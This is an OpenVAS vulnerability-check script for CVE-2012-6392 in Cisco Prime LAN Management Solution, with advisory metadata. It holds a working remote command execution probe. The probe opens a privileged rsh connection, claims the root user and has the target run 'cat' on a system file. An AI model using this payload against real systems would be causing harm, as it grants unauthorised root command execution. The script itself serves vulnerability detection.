###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_cisco_prime_lms_rce_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Cisco Prime LAN Management Solution Remote Command Execution Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to execute arbitrary command
  in the context of the root user.
  Impact Level: System/Application";

tag_affected = "Cisco Prime LMS Virtual Appliance Version 4.1 through 4.2.2 on Linux";
tag_insight = "Flaw is due to improper validation of authentication and authorization
  commands sent to certain TCP ports.";
tag_solution = "Upgrade to Cisco Prime LMS Virtual Appliance to 4.2.3 or later,
  http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130109-lms";
tag_summary = "The host is installed with Cisco Prime LAN Management Solution and
  is prone to remote command execution vulnerability.";

if(description)
{
  script_id(901215);
  script_version("$Revision: 11 $");
  script_bugtraq_id(57221);
  script_cve_id("CVE-2012-6392");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-01-24 16:05:48 +0530 (Thu, 24 Jan 2013)");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("Cisco Prime LAN Management Solution Remote Command Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/89112");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/81110");
  script_xref(name : "URL" , value : "http://telussecuritylabs.com/threats/show/TSL20130118-01");
  script_xref(name : "URL" , value : "http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20130109-lms");

  script_description(desc);
  script_copyright("Copyright (c) 2013 SecPod");
  script_summary("Check for RCE vulnerability in Cisco Prime LMS");
  script_category(ACT_ATTACK);
  script_family("CISCO");
  script_dependencies("os_fingerprint.nasl");
  script_require_ports("Services/rsh", 514);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("misc_func.inc");
include("host_details.inc");

res = "";
soc = "";
soc = "";
rsh_port = "";
crafted_data = "";

## Exit if its not windows
if(host_runs("Windows") == "yes")exit(0);

## Default RSH Port
rsh_port = get_kb_item("Services/rsh");
if(!rsh_port){
  rsh_port = 514;
}

## Check port state
if(!get_port_state(rsh_port)){
  exit(0);
}

## Open socket with privileged port
soc = open_priv_sock_tcp(dport:rsh_port);
if(!soc){
  exit(0);
}

## Crafted request which will cat command with lms.info file on the target
crafted_data = string('0\0',"root", '\0',"root",'\0',
                      'cat /opt/CSCOpx/setup/lms.info\0');

## Send crafted data and receive response
send(socket: soc, data: crafted_data);
res = recv(socket: soc, length: 2048);
close(soc);

## Check if we got the contents of lms.info file
if(res && "LAN Management Solution" >< res)
{
 security_hole(port: rsh_port);
 exit(0);
}
